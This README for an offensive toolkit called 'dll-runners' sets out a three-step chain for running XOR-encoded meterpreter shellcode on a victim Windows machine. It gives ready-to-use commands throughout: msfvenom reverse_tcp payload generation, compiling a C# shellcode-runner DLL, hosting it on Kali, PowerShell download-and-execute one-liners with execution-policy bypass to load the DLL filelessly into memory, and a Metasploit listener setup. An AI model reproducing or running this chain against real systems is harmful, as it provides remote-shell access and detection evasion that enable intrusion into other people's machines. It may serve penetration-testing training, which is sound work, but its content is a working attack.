# dll-runners

Three files that form a chain. Two are preparation tools you run on Kali; one is the delivery script that runs on the victim.

---

## File Roles

| File | Where it runs | Standalone or Chain? | Must compile? |
|------|--------------|----------------------|---------------|
| `DLL_Xor.cs` | Your machine (optional) | Chain — Step 1 (skippable) | Yes, as .exe |
| `DLL_Runner.cs` | Your machine | Chain — Step 2 | Yes, **as .dll** |
| `DLL_Loader.ps1` | Victim machine | Chain — Step 3 | No |

---

## The Chain

```
Step 1 (optional)      Step 2                    Step 3
DLL_Xor.cs        →   DLL_Runner.cs         →   DLL_Loader.ps1
                       (compile as .dll)
XOR your raw           Paste encoded bytes        Victim PowerShell:
shellcode with         into buf[], compile        Downloads .dll into
key 0xAA, print        as a Class Library         memory, calls runner()
hex output             (.dll not .exe)            via reflection.
                       Host on Kali.              DLL never touches disk.
```

---

## Step 1 — Encode Your Shellcode (skip DLL_Xor.cs, use this instead)

```bash
# Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=thread -f raw -o shell.bin

# XOR encode with key 0xAA — paste output into DLL_Runner.cs buf[]
python3 -c "
data = open('shell.bin','rb').read()
enc  = bytes(b ^ 0xAA for b in data)
print(','.join(f'0x{b:02x}' for b in enc))
"
```

`DLL_Xor.cs` does the same thing in C#. You don't need it if you XOR manually.

---

## Step 2 — DLL_Runner.cs

- Paste the XOR-encoded bytes into `buf[]`. Update the `new byte[XXX]` count.
- **Critical:** the namespace, class, and method must stay exactly as-is — `ClassLibrary1.Class1.runner()` — because that's what the loader calls.
- Compile **as a DLL** (not an exe):

**Visual Studio (Recommended — Windows dev box):**

1. **File → New → Project → Class Library (.NET Framework)** (NOT .NET Core / .NET 5+)
   - Name: **`ClassLibrary1`** — this MUST be exact (the loader script calls `ClassLibrary1.Class1.runner()`)
   - Framework: **.NET Framework 4.8**
   - Click Create
2. In Solution Explorer, rename/replace `Class1.cs` with the contents of `DLL_Runner.cs`
   (keep the filename `Class1.cs` — just replace the contents)
3. **Project → ClassLibrary1 Properties → Build tab:**
   - Platform target: **x64**
   - Check **"Allow unsafe code"**
4. **Build → Build Solution** (`Ctrl+Shift+B`)
5. Output: `bin\x64\Debug\ClassLibrary1.dll` — host this on Kali

**Alternative — csc.exe (Windows cmd):**
```cmd
csc.exe /unsafe /platform:x64 /target:library /out:runner.dll DLL_Runner.cs
```

- Host it:
```bash
cp runner.dll /var/www/html/
python3 -m http.server 80
```

---

## Step 3 — DLL_Loader.ps1 (victim)

No compilation. Edit the IP in the `$data` line, then run on the victim:

```powershell
# Option A — run the file
powershell -ExecutionPolicy Bypass -File .\DLL_Loader.ps1

# Option B — fully fileless (no .ps1 on disk)
IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/DLL_Loader.ps1')

# Option C — from inside an existing meterpreter session
meterpreter> load powershell
meterpreter> powershell_execute "IEX(New-Object Net.WebClient).DownloadString('http://<KALI_IP>/DLL_Loader.ps1')"
```

The DLL is downloaded as raw bytes (`DownloadData`), loaded via `[System.Reflection.Assembly]::Load()`, and `runner()` is called via reflection. **The DLL never touches disk.** Everything runs inside `powershell.exe`.

---

## Start Your Listener First

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST <YOUR_IP>; set LPORT 443; exploit -j"
```
